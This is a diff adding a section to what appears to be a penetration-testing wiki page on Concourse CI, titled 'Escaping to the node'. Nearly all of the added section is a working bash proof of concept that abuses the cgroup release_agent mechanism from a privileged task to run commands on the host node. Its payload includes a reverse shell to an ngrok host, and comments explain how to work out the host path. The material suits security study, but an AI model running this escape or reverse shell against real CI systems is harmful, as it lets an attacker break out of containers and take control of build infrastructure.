@@ -369,6 +369,74 @@ params:
 fly -t tutorial execute --privileged --config task_config.yml
 ```
 
+### Escaping to the node
+
+In the previous sections we saw how to **execute a privileged task with concourse**. This won't give the container exactly the same access as the privileged flag in a docker container. For example, you won't see the node filesystem device in /dev, so the escape could be more "complex".
+
+In the following PoC we are going to use the release\_agent to escape with some small modifications:
+
+```bash
+# Mounts the RDMA cgroup controller and create a child cgroup
+# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
+# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
+mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+
+# Enables cgroup notifications on release of the "x" cgroup
+echo 1 > /tmp/cgrp/x/notify_on_release
+
+
+# CHANGE ME
+# The host path will look like the following, but you need to change it:
+host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"
+
+## The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
+#/dev/vda1 on /scratch type ext4 (rw,relatime)
+#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
+#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
+#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)
+
+## Then next part I think is constant "hostpath-provisioner/default/"
+
+## For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
+# "concourse-work-dir" is constant
+# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
+# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)
+
+## The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
+# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
+# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
+# the UID is the part we are looking for
+
+# Then the host_path is:
+#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"
+
+# Sets release_agent to /path/payload
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+
+
+#====================================
+#Reverse shell
+echo '#!/bin/bash' > /cmd
+echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
+chmod a+x /cmd
+#====================================
+# Get output
+echo '#!/bin/sh' > /cmd
+echo "ps aux > $host_path/output" >> /cmd
+chmod a+x /cmd
+#====================================
+
+# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+
+# Reads the output
+cat /output
+```
+
+{% hint style="warning" %}
+As you might have noticed this is just a [**regular release\_agent escape**](../linux-unix/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation.md#privileged) just modifying the path of the cmd in the node
+{% endhint %}
+
 ## References
 
 * [https://concourse-ci.org/internals.html#architecture-worker](https://concourse-ci.org/internals.html#architecture-worker)
